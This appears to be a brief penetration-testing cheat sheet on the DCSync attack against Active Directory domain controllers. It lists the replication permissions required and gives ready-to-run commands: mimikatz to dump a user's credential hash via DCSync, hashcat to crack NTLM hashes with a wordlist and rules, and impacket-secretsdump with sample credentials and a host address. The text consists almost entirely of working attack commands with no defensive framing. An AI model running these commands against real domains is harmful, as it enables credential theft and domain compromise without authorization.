# Domain Controller Synchronization

__REQUIRES__

 The following permissions (Many roles have this by default):
 - Replicating Directory Changes
 - Replicating Directory Changes All
 - Replicating Directory Changes in Filter Sets

use mimikatz to dump dcsync
```powershell
mimikatz.exe
privilege::debug
lsadump::dcsync /user:corp\michelle
```

crack the hash
```bash
hashcat -m 1000 hashes.dcsync /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```

Using an account with these permissions, ntds hashes will be dumped
```bash
impacket-secretsdump -just-dc-user michelle corp.com/corpadmin:"password123\!"@192.168.0.25
```
